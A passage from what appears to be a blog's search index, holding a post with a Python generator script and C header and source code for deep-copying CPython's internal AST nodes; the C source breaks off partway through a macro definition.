<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CPython internal AST structure deep-copy functions</title>
      <link href="/2024/07/20/cpython-ast-helpers/"/>
      <url>/2024/07/20/cpython-ast-helpers/</url>
      
        <content type="html"><![CDATA[<h2 id="source-codes"><a href="#source-codes" class="headerlink" title="source codes"></a>source codes</h2><h3 id="deepcopy-ast-py"><a href="#deepcopy-ast-py" class="headerlink" title="deepcopy_ast.py"></a>deepcopy_ast.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment"># This script is used to generate deepcopy functions for CPython internal AST nodes.</span></span><br><span class="line"><span class="comment"># License: MIT</span></span><br><span class="line"><span class="comment"># Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># Date: July 20, 2024</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: python deepcopy_ast.py &lt;header&gt; &lt;output&gt;&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">TARGETS = [<span class="string">&quot;expr&quot;</span>, <span class="string">&quot;stmt&quot;</span>, <span class="string">&quot;excepthandler&quot;</span>,</span><br><span class="line">           <span class="string">&quot;pattern&quot;</span>, <span class="string">&quot;type_ignore&quot;</span>, <span class="string">&quot;type_param&quot;</span>, <span class="string">&quot;mod&quot;</span>]</span><br><span class="line">INDIVIDUAL_TARGETS = [<span class="string">&quot;comprehension&quot;</span>, <span class="string">&quot;arguments&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;arg&quot;</span>, <span class="string">&quot;keyword&quot;</span>, <span class="string">&quot;alias&quot;</span>, <span class="string">&quot;withitem&quot;</span>, <span class="string">&quot;match_case&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UNION_TARGET_TEMPLATE = <span class="string">&quot;&quot;&quot;%s_ty %s_copy(%s_ty val, PyArena *arena)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    if(val == NULL)&#123;</span></span><br><span class="line"><span class="string">        return NULL;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    %s_ty re = _PyArena_Malloc(arena, sizeof(struct _%s));</span></span><br><span class="line"><span class="string">    re-&gt;kind = val-&gt;kind;</span></span><br><span class="line"><span class="string">    switch (val-&gt;kind) &#123;</span></span><br><span class="line"><span class="string">    BODY</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    OTHER</span></span><br><span class="line"><span class="string">    return re;</span></span><br><span class="line"><span class="string">&#125;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">UNION_STMT_PATCH = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">case Pass_kind:</span></span><br><span class="line"><span class="string">case Break_kind:</span></span><br><span class="line"><span class="string">case Continue_kind:</span></span><br><span class="line"><span class="string">    break;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip()</span><br><span class="line"></span><br><span class="line">INDIVIDUAL_TARGET_TEMPLATE = <span class="string">&quot;&quot;&quot;%s_ty %s_copy(%s_ty val, PyArena *arena)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    if(val == NULL)&#123;</span></span><br><span class="line"><span class="string">        return NULL;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    %s_ty re = _PyArena_Malloc(arena, sizeof(struct _%s));</span></span><br><span class="line"><span class="string">    BODY</span></span><br><span class="line"><span class="string">    return re;</span></span><br><span class="line"><span class="string">&#125;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">header = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(header, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    codes_raw = f.read().strip().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_struct</span>(<span class="params">start: <span class="built_in">int</span>, codes: <span class="built_in">list</span>[<span class="built_in">str</span>], name: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    parse_code = <span class="string">&quot;\n&quot;</span></span><br><span class="line">    end = start + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> codes[end].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).startswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">        end += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        name = codes[end].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).removeprefix(<span class="string">&quot;&#125;&quot;</span>).removesuffix(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(start + <span class="number">1</span>, end):</span><br><span class="line">        <span class="keyword">if</span> codes[j].strip() == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        code = codes[j].strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        n = code[<span class="number">1</span>].removesuffix(<span class="string">&quot;;&quot;</span>).removeprefix(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">        t = code[<span class="number">0</span>].removesuffix(<span class="string">&quot;_ty&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> t == <span class="string">&quot;int&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> name <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                parse_code += <span class="string">f&quot;re-&gt;<span class="subst">&#123;n&#125;</span> = val-&gt;<span class="subst">&#123;n&#125;</span>;\n&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                parse_code += <span class="string">f&quot;re-&gt;v.<span class="subst">&#123;name&#125;</span>.<span class="subst">&#123;n&#125;</span> = val-&gt;v.<span class="subst">&#123;name&#125;</span>.<span class="subst">&#123;n&#125;</span>;\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(name, t, n)</span></span><br><span class="line">            <span class="keyword">if</span> name <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                parse_code += <span class="string">f&quot;re-&gt;<span class="subst">&#123;n&#125;</span> = <span class="subst">&#123;t&#125;</span>_copy(val-&gt;<span class="subst">&#123;n&#125;</span>, arena);\n&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                parse_code += <span class="string">f&quot;re-&gt;v.<span class="subst">&#123;name&#125;</span>.<span class="subst">&#123;n&#125;</span> = <span class="subst">&#123;t&#125;</span>_copy(val-&gt;v.<span class="subst">&#123;name&#125;</span>.<span class="subst">&#123;n&#125;</span>, arena);\n&quot;</span></span><br><span class="line">    parse_code = parse_code.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\n&quot;</span> + <span class="string">&quot; &quot;</span> * <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        parse_code = <span class="string">f&quot;case <span class="subst">&#123;name&#125;</span>_kind:<span class="subst">&#123;parse_code&#125;</span>break;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (end, parse_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_targets</span>(<span class="params">codes: <span class="built_in">list</span>[<span class="built_in">str</span>], target: <span class="built_in">str</span></span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(codes) <span class="keyword">and</span> codes[i].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>) != <span class="string">&quot;struct_%s&#123;&quot;</span> % target:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    codes = codes[i + <span class="number">1</span>:]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(codes) <span class="keyword">and</span> codes[i].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>) != <span class="string">&quot;&#125;v;&quot;</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    body_codes = codes[:i]</span><br><span class="line">    ii = i</span><br><span class="line">    <span class="keyword">while</span> ii &lt; <span class="built_in">len</span>(codes) <span class="keyword">and</span> codes[ii].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>) != <span class="string">&quot;&#125;;&quot;</span>:</span><br><span class="line">        ii += <span class="number">1</span></span><br><span class="line">    other_codes = codes[i:ii + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    template = UNION_TARGET_TEMPLATE % (target, target, target, target, target)</span><br><span class="line">    body = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    base = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(body_codes) <span class="keyword">and</span> body_codes[i].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>) != <span class="string">&quot;struct&#123;&quot;</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="built_in">len</span>(body_codes):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i, code = parse_struct(i + base, body_codes)</span><br><span class="line">        body += code + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> target == <span class="string">&quot;stmt&quot;</span>:</span><br><span class="line">        body += UNION_STMT_PATCH</span><br><span class="line">    body = body.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\n&quot;</span> + <span class="string">&quot; &quot;</span> * <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(other_codes) &gt; <span class="number">1</span>:</span><br><span class="line">        _, code = parse_struct(<span class="number">0</span>, other_codes, <span class="literal">None</span>)</span><br><span class="line">        template = template.replace(<span class="string">&quot;OTHER&quot;</span>, code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> template.replace(<span class="string">&quot;BODY&quot;</span>, <span class="string">&quot; &quot;</span> * <span class="number">3</span> + body)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_individual_targets</span>(<span class="params">codes: <span class="built_in">list</span>[<span class="built_in">str</span>], target: <span class="built_in">str</span></span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(codes) <span class="keyword">and</span> codes[i].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>) != <span class="string">&quot;struct_%s&#123;&quot;</span> % target:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    codes = codes[i:]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(codes) <span class="keyword">and</span> codes[i] != <span class="string">&quot;&#125;;&quot;</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    codes = codes[:i + <span class="number">1</span>]</span><br><span class="line">    template = INDIVIDUAL_TARGET_TEMPLATE % (</span><br><span class="line">        target, target, target, target, target)</span><br><span class="line">    _, body = parse_struct(<span class="number">0</span>, codes, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> template.replace(<span class="string">&quot;BODY&quot;</span>, <span class="string">&quot; &quot;</span> * <span class="number">3</span> + body)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FILE_CONTENT = <span class="string">&quot;#include \&quot;deepcopy_gen.h\&quot;\n&quot;</span></span><br><span class="line">HEADER_CONTENT = <span class="string">&quot;#ifndef DEEPCOPY_GEN_H\n#define DEEPCOPY_GEN_H\n\n#include \&quot;deepcopy.h\&quot;\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> TARGETS:</span><br><span class="line">    FILE_CONTENT += gen_targets(codes_raw, t) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    HEADER_CONTENT += <span class="string">f&quot;<span class="subst">&#123;t&#125;</span>_ty <span class="subst">&#123;t&#125;</span>_copy(<span class="subst">&#123;t&#125;</span>_ty val, PyArena *arena);\n&quot;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> INDIVIDUAL_TARGETS:</span><br><span class="line">    FILE_CONTENT += gen_individual_targets(codes_raw, t) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    HEADER_CONTENT += <span class="string">f&quot;<span class="subst">&#123;t&#125;</span>_ty <span class="subst">&#123;t&#125;</span>_copy(<span class="subst">&#123;t&#125;</span>_ty val, PyArena *arena);\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">2</span>] + <span class="string">&quot;.c&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(FILE_CONTENT)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">2</span>] + <span class="string">&quot;.h&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(HEADER_CONTENT + <span class="string">&quot;\n#endif&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>and some manually written implementations</p><h3 id="deepcopy-h"><a href="#deepcopy-h" class="headerlink" title="deepcopy.h"></a>deepcopy.h</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEEPCOPY_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEEPCOPY_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Py_BUILD_CORE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Python.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pycore_ast.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;deepcopy_gen.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">expr_ty <span class="title function_">expr_copy</span><span class="params">(expr_ty val, PyArena *arena)</span>;</span><br><span class="line">stmt_ty <span class="title function_">stmt_copy</span><span class="params">(stmt_ty val, PyArena *arena)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASDL_SEQ_COPY_HEADER(type)                                  \</span></span><br><span class="line"><span class="meta">    type *type##_copy(type *seq, PyArena *arena);                   \</span></span><br><span class="line"><span class="meta">    type *type##_copy_add(type *seq, PyArena *arena, int add_size); \</span></span><br><span class="line"><span class="meta">    type *type##_copy_add_front(type *seq, PyArena *arena, int add_size);</span></span><br><span class="line"></span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_expr_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_stmt_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_keyword_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_int_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_arg_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_type_param_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_comprehension_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_alias_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_excepthandler_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_type_ignore_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_withitem_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_match_case_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_identifier_seq)</span><br><span class="line">ASDL_SEQ_COPY_HEADER(asdl_pattern_seq)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRIAL_COPY_HEDER(type) type##_ty type##_copy(type##_ty val, PyArena *arena);</span></span><br><span class="line">TRIAL_COPY_HEDER(boolop)</span><br><span class="line">TRIAL_COPY_HEDER(operator)</span><br><span class="line">TRIAL_COPY_HEDER(unaryop)</span><br><span class="line">TRIAL_COPY_HEDER(cmpop)</span><br><span class="line">TRIAL_COPY_HEDER(expr_context)</span><br><span class="line">identifier <span class="title function_">identifier_copy</span><span class="params">(identifier val, PyArena *arena)</span>;</span><br><span class="line">PyObject *<span class="title function_">constant_copy</span><span class="params">(PyObject *val, PyArena *arena)</span>;</span><br><span class="line">PyObject *<span class="title function_">string_copy</span><span class="params">(PyObject *val, PyArena *arena)</span>;</span><br><span class="line"><span class="comment">// PyObject *object_copy(PyObject *val, PyArena *arena);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEEPCOPY_H</span></span></span><br></pre></td></tr></table></figure><h3 id="deepcopy-c"><a href="#deepcopy-c" class="headerlink" title="deepcopy.c"></a>deepcopy.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;deepcopy.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// implement log funcs yourself</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO(fmt, ...) info(fmt, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR(fmt, ...) <span class="keyword">error</span>(fmt, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PANIC(fmt, ...) panic(fmt, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">PyObject *<span class="title function_">PyUnicode_FromString_Arena</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s, PyArena *arena)</span></span><br><span class="line">&#123;</span><br><span class="line">    PyObject *re = (PyObject *)PyUnicode_FromString(s);</span><br><span class="line">    _PyArena_AddPyObject(arena, re);</span><br><span class="line">    <span class="comment">// check obj2ast_constant from CPython source code</span></span><br><span class="line">    Py_INCREF(re);</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PyObject *<span class="title function_">PyLong_Copy_Arena</span><span class="params">(PyObject *s, PyArena *arena)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    PyObject *re = (PyObject *)PyLong_FromLongLong(PyLong_AsLongLong(s));</span><br><span class="line">    _PyArena_AddPyObject(arena, re);</span><br><span class="line">    <span class="comment">// check obj2ast_constant from CPython source code</span></span><br><span class="line">    Py_INCREF(re);</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PyObject *<span class="title function_">PyUnicode_Copy_Arena</span><span class="params">(PyObject *s, PyArena *arena)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Py_ssize_t length = PyUnicode_GET_LENGTH(s);</span><br><span class="line">    PyObject *re = (PyObject *)PyUnicode_New(length, PyUnicode_MAX_CHAR_VALUE(s));</span><br><span class="line">    <span class="built_in">memcpy</span>(PyUnicode_DATA(re), PyUnicode_DATA(s), length * PyUnicode_KIND(s)); <span class="comment">// from _PyUnicode_Copy but no checks</span></span><br><span class="line">    _PyArena_AddPyObject(arena, re);</span><br><span class="line">    <span class="comment">// check obj2ast_constant from CPython source code</span></span><br><span class="line">    Py_INCREF(re);</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PyObject *<span class="title function_">PyLong_FromLong_Arena</span><span class="params">(<span class="type">long</span> n, PyArena *arena)</span></span><br><span class="line">&#123;</span><br><span class="line">    PyObject *re = (PyObject *)PyLong_FromLong(n);</span><br><span class="line">    _PyArena_AddPyObject(arena, re);</span><br><span class="line">    <span class="comment">// check obj2ast_constant from CPython source code</span></span><br><span class="line">    Py_INCREF(re);</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRIAL_COPY(type)                                 \</span></span><br><span class="line"><span class="meta">    type##_ty type##_copy(type##_ty val, PyArena *arena) \</span></span><br><span 